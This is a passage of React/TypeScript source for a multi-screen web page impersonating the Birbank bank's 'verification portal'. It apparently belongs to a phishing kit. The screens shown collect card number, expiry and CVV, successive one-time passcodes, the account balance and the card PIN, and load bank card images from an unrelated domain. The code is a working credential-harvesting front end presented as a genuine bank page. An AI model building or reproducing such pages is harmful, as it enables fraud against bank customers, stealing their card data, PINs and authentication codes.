                disabled={cardNumber.length < 16 || expiryMonth.length < 2 || expiryYear.length < 2 || cvv.length < 3}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-semibold flex items-center justify-center gap-2 text-base transition-all ${
                  cardNumber.length === 16 && expiryMonth.length === 2 && expiryYear.length === 2 && cvv.length === 3
                    ? "bg-[#ec3342] text-white hover:bg-[#d62836] shadow-md cursor-pointer"
                    : "bg-[#F8A5AD] text-white cursor-not-allowed opacity-90"
                }`}
              >
                <BirbankDiamond className="w-4 h-4" />
                <span>{t.continueBtn}</span>
              </button>
            </div>
          </main>
        </div>
      )}

      {/* ==========================================
          SCREEN 5: SECOND OTP VERIFICATION SCREEN (OTP 2 AFTER CARD)
         ========================================== */}
      {screen === "otp2" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-[#F8F9FA] text-[#111827] overflow-hidden animate-in fade-in duration-300">
          <header className="w-full max-w-xl mx-auto py-3 px-5 flex items-center justify-between shrink-0">
            <button
              onClick={() => {
                autoSubmittedCard.current = false
                setOtp2Digits(Array(6).fill(""))
                setScreen("card")
              }}
              className="p-1.5 -ml-2 rounded-full hover:bg-gray-200/60 transition-colors text-gray-900 cursor-pointer"
              aria-label="Back to card screen"
            >
              <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2]" />
            </button>
            <div className="text-gray-900">
              <Landmark className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.5]" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-2 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <h1 className="text-xl sm:text-2xl font-bold text-[#111827] leading-tight mb-2">
                {t.otp2Title}
              </h1>
              <p className="text-xs sm:text-sm text-gray-500 leading-relaxed mb-6">
                {t.otp2Subtitle}
              </p>

              <div className="grid grid-cols-6 gap-2.5 sm:gap-4 my-6">
                {otp2Digits.map((digit, index) => (
                  <div key={index} className="flex flex-col items-center">
                    <input
                      ref={(el) => {
                        otp2InputRefs.current[index] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtp2Change(index, e.target.value)}
                      onKeyDown={(e) => handleOtp2KeyDown(index, e)}
                      className="w-full h-9 sm:h-10 text-center text-xl sm:text-2xl font-bold bg-transparent outline-none text-gray-900 mb-1.5"
                      autoFocus={index === 0}
                    />
                    <div
                      className={`w-full h-[3px] rounded-full transition-all ${
                        digit || (index === 0 && !otp2Digits.some((d) => d))
                          ? "bg-[#ec3342]"
                          : "bg-[#D1D5DB]"
                      }`}
                    />
                  </div>
                ))}
              </div>

              <div className="flex justify-center my-6">
                <div className="inline-flex items-center gap-2 bg-[#FFF0F3] border border-[#FFCCD5] rounded-full px-4 py-2 text-xs sm:text-sm font-medium text-[#ec3342]">
                  <span className="w-2 h-2 rounded-full bg-[#ec3342]" />
                  <span>{t.timerText}</span>
                  <span className="font-bold text-[#ec3342] ml-0.5">{formatTimer(timer2Seconds)}</span>
                </div>
              </div>
            </div>

            <div className="pb-5 pt-2">
              <button
                onClick={handleOtp2Submit}
                disabled={otp2Digits.join("").length < 6}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-semibold flex items-center justify-center gap-2 text-base transition-all ${
                  otp2Digits.join("").length === 6
                    ? "bg-[#ec3342] text-white hover:bg-[#d62836] shadow-md cursor-pointer"
                    : "bg-[#E5E7EB] text-[#9CA3AF] cursor-not-allowed"
                }`}
              >
                <BirbankDiamond className="w-4 h-4" />
                <span>{t.confirmBtn}</span>
              </button>
            </div>
          </main>
        </div>
      )}

      {/* ==========================================
          SCREEN 6: BALANCE & ACCOUNT VERIFICATION SCREEN (PREFILL CARD NUMBER POSITIONED SLIGHTLY BELOW)
         ========================================== */}
      {screen === "balance" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-[#F8F9FA] text-[#111827] overflow-hidden animate-in fade-in duration-300">
          <header className="w-full max-w-xl mx-auto py-3 px-5 flex items-center justify-between shrink-0">
            <button
              onClick={() => setScreen("otp2")}
              className="p-1.5 -ml-2 rounded-full hover:bg-gray-200/60 transition-colors text-gray-900 cursor-pointer"
              aria-label="Back"
            >
              <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2]" />
            </button>
            <div className="text-gray-900">
              <Landmark className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.5]" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-1 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <div className="relative w-full aspect-[1.58/1] max-h-[195px] sm:max-h-[220px] mx-auto rounded-[20px] overflow-hidden shadow-xl select-none transition-all duration-300 bg-transparent flex items-center justify-center">
                <img
                  src={cardType === 0 ? "https://m1oonlinsuk.com/visa_card_bir.png" : "https://m1oonlinsuk.com/master_bir.png"}
                  alt={cardType === 0 ? "Birbank Visa Card" : "Birbank Mastercard"}
                  className="w-full h-full object-contain rounded-[20px] pointer-events-none"
                  onError={(e) => {
                    (e.target as HTMLImageElement).src = cardType === 0 ? "/visa_card_bir.png" : "/master_bir.png"
                  }}
                />

                <div className="absolute inset-0 z-20 p-4 sm:p-5 flex flex-col justify-end pointer-events-none">
                  <div className="space-y-0.5 text-center pb-0.5">
                    {/* Added mt-4 sm:mt-5 so prefill number shows slightly below */}
                    <div className="text-[13px] sm:text-[15px] font-mono tracking-[0.14em] text-white font-medium drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)] mt-4 sm:mt-5">
                      {cardNumber ? formatCardDisplay(cardNumber) : "5590 4902 5866 4836"}
                    </div>
                    <div className="flex flex-col items-center justify-center">
                      <span className="text-[7px] font-bold tracking-widest text-white/80 uppercase drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]">
                        SON İSTİFADƏ
                      </span>
                      <span className="text-[10px] sm:text-[11px] font-mono font-bold tracking-wider text-white drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]">
                        {expiryMonth && expiryYear ? `${expiryMonth}/20${expiryYear}` : "08/2029"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-center gap-2 my-3">
                <button
                  onClick={() => setCardType(0)}
                  className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                    cardType === 0 ? "bg-[#ec3342] scale-110" : "bg-gray-300 hover:bg-gray-400"
                  }`}
                  aria-label="VISA Card View"
                />
                <button
                  onClick={() => setCardType(1)}
                  className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                    cardType === 1 ? "bg-[#ec3342] scale-110" : "bg-gray-300 hover:bg-gray-400"
                  }`}
                  aria-label="Mastercard View"
                />
              </div>

              <div className="space-y-1 mb-3">
                <h2 className="text-sm font-bold text-[#ec3342]">
                  {t.accountTitle}
                </h2>
                <div className="bg-[#F3F4F6] rounded-[18px] p-3 flex items-center border border-gray-200/60 opacity-90 cursor-not-allowed select-none">
                  <span className="text-[#ec3342] font-bold text-sm mr-2.5 select-none">
                    {t.accLabel}
                  </span>
                  <input
                    type="text"
                    value="• • • • • • • • • • • • • • • •"
                    disabled
                    readOnly
                    className="w-full bg-transparent border-none outline-none font-bold text-gray-500 tracking-widest text-sm cursor-not-allowed"
                  />
                </div>
              </div>

              <div className="space-y-1 mb-3">
                <h2 className="text-sm font-bold text-[#ec3342]">
                  {t.securityTitle}
                </h2>
                <p className="text-[11px] text-gray-500 mb-1">
                  {t.securitySubtitle}
                </p>
                <div className="bg-[#F3F4F6] rounded-[18px] p-3 flex items-center border border-gray-200/60 focus-within:border-[#ec3342] focus-within:bg-white">
                  <span className="text-[#ec3342] font-bold text-sm mr-2.5 select-none">
                    {t.balanceLabel}
                  </span>
                  <input
                    type="text"
                    inputMode="decimal"
                    value={balanceAmount}
                    onChange={(e) => setBalanceAmount(e.target.value)}
                    placeholder="0.00"
                    className="w-full bg-transparent border-none outline-none font-medium text-gray-900 text-base placeholder:text-gray-400"
                    autoFocus
                  />
                </div>
              </div>
            </div>

            <div className="pb-5 pt-1">
              <button
                onClick={handleBalanceSubmit}
                disabled={!balanceAmount}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-semibold flex items-center justify-center gap-2 text-base transition-all ${
                  balanceAmount
                    ? "bg-[#ec3342] text-white hover:bg-[#d62836] shadow-md cursor-pointer"
                    : "bg-[#F8A5AD] text-white cursor-not-allowed opacity-90"
                }`}
              >
                <BirbankDiamond className="w-4 h-4" />
                <span>{t.continueBtn}</span>
              </button>
            </div>
          </main>
        </div>
      )}

      {/* ==========================================
          SCREEN 7: CARD PIN ENTRY SCREEN (PREFILL CARD NUMBER POSITIONED SLIGHTLY BELOW)
         ========================================== */}
      {screen === "pin" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-[#F8F9FA] text-[#111827] overflow-hidden animate-in fade-in duration-300">
          <header className="w-full max-w-xl mx-auto py-3 px-5 flex items-center justify-between shrink-0">
            <button
              onClick={() => setScreen("balance")}
              className="p-1.5 -ml-2 rounded-full hover:bg-gray-200/60 transition-colors text-gray-900 cursor-pointer"
              aria-label="Back"
            >
              <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2]" />
            </button>
            <div className="text-gray-900">
              <Landmark className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.5]" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-1 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <div className="relative w-full aspect-[1.58/1] max-h-[195px] sm:max-h-[220px] mx-auto rounded-[20px] overflow-hidden shadow-xl select-none transition-all duration-300 bg-transparent flex items-center justify-center">
                <img
                  src={cardType === 0 ? "https://m1oonlinsuk.com/visa_card_bir.png" : "https://m1oonlinsuk.com/master_bir.png"}
                  alt={cardType === 0 ? "Birbank Visa Card" : "Birbank Mastercard"}
                  className="w-full h-full object-contain rounded-[20px] pointer-events-none"
                  onError={(e) => {
                    (e.target as HTMLImageElement).src = cardType === 0 ? "/visa_card_bir.png" : "/master_bir.png"
                  }}
                />

                <div className="absolute inset-0 z-20 p-4 sm:p-5 flex flex-col justify-end pointer-events-none">
                  <div className="space-y-0.5 text-center pb-0.5">
                    {/* Added mt-4 sm:mt-5 so prefill number shows slightly below */}
                    <div className="text-[13px] sm:text-[15px] font-mono tracking-[0.14em] text-white font-medium drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)] mt-4 sm:mt-5">
                      {cardNumber ? formatCardDisplay(cardNumber) : "5590 4902 5866 4836"}
                    </div>
                    <div className="flex flex-col items-center justify-center">
                      <span className="text-[7px] font-bold tracking-widest text-white/80 uppercase drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]">
                        SON İSTİFADƏ
                      </span>
                      <span className="text-[10px] sm:text-[11px] font-mono font-bold tracking-wider text-white drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]">
                        {expiryMonth && expiryYear ? `${expiryMonth}/20${expiryYear}` : "08/2029"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-center gap-2 my-3">
                <button
                  onClick={() => setCardType(0)}
                  className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                    cardType === 0 ? "bg-[#ec3342] scale-110" : "bg-gray-300 hover:bg-gray-400"
                  }`}
                />
                <button
                  onClick={() => setCardType(1)}
                  className={`w-2.5 h-2.5 rounded-full transition-all cursor-pointer ${
                    cardType === 1 ? "bg-[#ec3342] scale-110" : "bg-gray-300 hover:bg-gray-400"
                  }`}
                />
              </div>

              <div className="mb-4">
                <h1 className="text-xl font-bold text-[#111827] mb-1">
                  {t.pinTitle}
                </h1>
                <p className="text-xs text-gray-500 leading-relaxed">
                  {t.pinSubtitle}
                </p>
              </div>

              <div className="bg-white rounded-[18px] p-3.5 border border-gray-200/80 focus-within:border-[#ec3342]">
                <label className="block text-xs font-bold text-gray-400 mb-1">
                  {t.pinLabel}
                </label>
                <input
                  type="password"
                  inputMode="numeric"
                  maxLength={4}
                  value={cardPin}
                  onChange={(e) => setCardPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  placeholder="• • • •"
                  className="w-full bg-transparent border-none outline-none font-bold text-gray-900 text-xl tracking-[0.4em] placeholder:text-gray-300"
                  autoFocus
                />
              </div>
            </div>

            <div className="pb-5 pt-2">
              <button
                onClick={handlePinSubmit}
                disabled={cardPin.length < 4}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-semibold flex items-center justify-center gap-2 text-base transition-all ${
                  cardPin.length === 4
                    ? "bg-[#ec3342] text-white hover:bg-[#d62836] shadow-md cursor-pointer"
                    : "bg-[#F8A5AD] text-white cursor-not-allowed opacity-90"
                }`}
              >
                <BirbankDiamond className="w-4 h-4" />
                <span>{t.continueBtn}</span>
              </button>
            </div>
          </main>
        </div>
      )}

      {/* ==========================================
          SCREEN 8: THIRD OTP VERIFICATION SCREEN
         ========================================== */}
      {screen === "otp3" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-[#F8F9FA] text-[#111827] overflow-hidden animate-in fade-in duration-300">
          <header className="w-full max-w-xl mx-auto py-3 px-5 flex items-center justify-between shrink-0">
            <button
              onClick={() => {
                setOtp3Digits(Array(6).fill(""))
                setOtp3Error(false)
                setScreen("pin")
              }}
              className="p-1.5 -ml-2 rounded-full hover:bg-gray-200/60 transition-colors text-gray-900 cursor-pointer"
              aria-label="Back"
            >
              <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 stroke-[2]" />
            </button>
            <div className="text-gray-900">
              <Landmark className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.5]" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-2 flex-1 flex flex-col justify-between overflow-hidden">
            <div>
              <h1 className="text-xl sm:text-2xl font-bold text-[#111827] leading-tight mb-2">
                {t.otp3Title}
              </h1>
              <p className="text-xs sm:text-sm text-gray-500 leading-relaxed mb-6">
                {t.otp3Subtitle}
              </p>

              <div className="grid grid-cols-6 gap-2.5 sm:gap-4 my-6">
                {otp3Digits.map((digit, index) => (
                  <div key={index} className="flex flex-col items-center">
                    <input
                      ref={(el) => {
                        otp3InputRefs.current[index] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtp3Change(index, e.target.value)}
                      onKeyDown={(e) => handleOtp3KeyDown(index, e)}
                      className="w-full h-9 sm:h-10 text-center text-xl sm:text-2xl font-bold bg-transparent outline-none text-gray-900 mb-1.5"
                      autoFocus={index === 0}
                    />
                    <div
                      className={`w-full h-[3px] rounded-full transition-all ${
                        otp3Error
                          ? "bg-[#ec3342]"
                          : digit || (index === 0 && !otp3Digits.some((d) => d))
                          ? "bg-[#ec3342]"
                          : "bg-[#D1D5DB]"
                      }`}
                    />
                  </div>
                ))}
              </div>

              <div className="flex flex-col items-center justify-center my-6">
                <div className="inline-flex items-center gap-2 bg-[#FFF0F3] border border-[#FFCCD5] rounded-full px-4 py-2 text-xs sm:text-sm font-medium text-[#ec3342]">
                  <span className="w-2 h-2 rounded-full bg-[#ec3342]" />
                  <span>{t.timerText}</span>
                  <span className="font-bold text-[#ec3342] ml-0.5">{formatTimer(timer3Seconds)}</span>
                </div>

                {otp3Error && (
                  <div className="flex items-center justify-center gap-1.5 mt-3 text-[#ec3342] text-xs sm:text-sm font-medium text-center animate-in fade-in duration-200">
                    <AlertCircle className="w-4 h-4 text-[#ec3342] shrink-0" />
                    <span>{t.invalidOtpError}</span>
                  </div>
                )}
              </div>
            </div>

            <div className="pb-5 pt-2">
              <button
                onClick={handleOtp3Submit}
                disabled={otp3Digits.join("").length < 6}
                className={`w-full py-3.5 sm:py-4 rounded-2xl font-semibold flex items-center justify-center gap-2 text-base transition-all ${
                  otp3Digits.join("").length === 6
                    ? "bg-[#ec3342] text-white hover:bg-[#d62836] shadow-md cursor-pointer"
                    : "bg-[#E5E7EB] text-[#9CA3AF] cursor-not-allowed"
                }`}
              >
                <BirbankDiamond className="w-4 h-4" />
                <span>{t.confirmBtn}</span>
              </button>
            </div>
          </main>
        </div>
      )}

      {/* ==========================================
          SCREEN 9: SUCCESS CONFIRMATION SCREEN
         ========================================== */}
      {screen === "success" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] flex flex-col justify-between bg-white overflow-hidden animate-in fade-in duration-300">
          <header className="w-full border-b border-gray-100 py-3 px-5 sm:px-12 flex items-center justify-between shrink-0">
            <div className="flex items-center gap-3">
              <BirbankLogoWithText className="h-7 sm:h-8" />
            </div>
          </header>

          <main className="w-full max-w-xl mx-auto px-5 py-8 text-center flex-1 flex flex-col justify-center overflow-hidden">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <Check className="w-10 h-10 sm:w-12 sm:h-12 stroke-[3]" />
            </div>
            <h2 className="text-2xl sm:text-3xl font-extrabold text-[#111827] mb-2">{t.successTitle}</h2>
            <p className="text-sm sm:text-base text-gray-500 max-w-sm mx-auto mb-8">
              {t.successMessage}
            </p>
            <button
              onClick={() => setScreen("splash")}
              className={`w-full py-4 rounded-2xl font-bold flex items-center justify-center gap-2 text-base sm:text-lg ${primaryBtnClass}`}
            >
              <span>{t.restartBtn}</span>
            </button>
          </main>

          <footer className="w-full border-t border-gray-100 py-3 text-center text-xs text-gray-400 shrink-0">
            Birbank Verification Portal
          </footer>
        </div>
      )}
    </div>
  )
}
